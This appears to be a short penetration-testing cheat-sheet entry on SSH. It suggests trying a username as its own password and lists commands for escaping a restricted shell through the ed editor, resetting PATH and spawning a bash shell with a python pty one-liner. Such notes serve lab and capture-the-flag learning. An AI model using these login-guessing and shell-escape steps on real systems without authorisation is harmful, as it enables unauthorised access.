#### ==🔵SSH (Port 22)==

If you found that ssh is open 
and you find any username 

==🔴login in to the user on ssh 
and in password enter the username itself==

ssh login : 
```
ssh username@ip
```
then enter password 

if you connect to ssh and are unable to execute any command , you are in a restricted shell 
to get out of it : 
https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/
go to `ed` editor , run : 
```
ed
```
Once we are in the ed-editor, we then run the following command to call /bin/sh:
```
! '/bin/sh'
```
After running the above command we can export a new path and then spawn a python shell then again export the path to have full functionover the shell session.
Run one by one : 
```
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin

python -c 'import pty; pty.spawn("/bin/bash")'

PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```
